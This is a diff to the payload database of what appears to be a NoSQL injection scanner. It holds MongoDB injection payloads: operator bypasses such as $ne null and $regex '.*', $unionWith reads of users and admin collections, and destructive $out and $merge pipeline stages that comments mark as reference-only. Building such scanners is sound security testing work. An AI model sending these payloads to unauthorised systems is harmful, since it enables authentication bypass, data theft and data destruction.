@@ -486,9 +486,22 @@ public class PayloadDatabase {
         payloads.add("{\"$unionWith\": \"users\"}");
         payloads.add("{\"$unionWith\": \"admin\"}");
 
-        // $out to write to another collection
-        payloads.add("{\"$out\": \"nosqli_hunter_test_output\"}");
+        // $out is deliberately NOT here: if the target executes the
+        // pipeline it DROPS+WRITES a real collection — detection stays
+        // read-only (see getAggregationDestructivePayloads).
 
+        return payloads;
+    }
+
+    /**
+     * Write-side pipeline payloads. Never sent by any scan — reference
+     * only (cheatsheet). Sending $out against a target that executes
+     * pipelines destroys data in the named collection.
+     */
+    public static List<String> getAggregationDestructivePayloads() {
+        List<String> payloads = new ArrayList<>();
+        payloads.add("{\"$out\": \"nosqli_hunter_test_output\"}");
+        payloads.add("{\"$merge\": {\"into\": \"nosqli_hunter_test_output\"}}");
         return payloads;
     }
 
@@ -497,16 +510,19 @@ public class PayloadDatabase {
     // ─────────────────────────────────────────────────────────────
 
     /**
-     * Returns payloads formatted as JSON for when we upgrade
-     * Content-Type from urlencoded to application/json.
+     * Operator VALUES for the Content-Type confusion scan: the caller
+     * rebuilds the body as JSON with every original parameter preserved,
+     * replacing only the target parameter's value with one of these —
+     * replacing the whole body used to silently drop CSRF fields and
+     * guarantee a 403 "diff" that was pure noise.
      */
-    public static List<String> getContentTypeConfusionPayloads(String paramName) {
+    public static List<String> getContentTypeConfusionOperators() {
         List<String> payloads = new ArrayList<>();
 
-        payloads.add("{\"" + paramName + "\": {\"$ne\": null}}");
-        payloads.add("{\"" + paramName + "\": {\"$gt\": \"\"}}");
-        payloads.add("{\"" + paramName + "\": {\"$regex\": \".*\"}}");
-        payloads.add("{\"" + paramName + "\": {\"$exists\": true}}");
+        payloads.add("{\"$ne\": null}");
+        payloads.add("{\"$gt\": \"\"}");
+        payloads.add("{\"$regex\": \".*\"}");
+        payloads.add("{\"$exists\": true}");
 
         return payloads;
     }
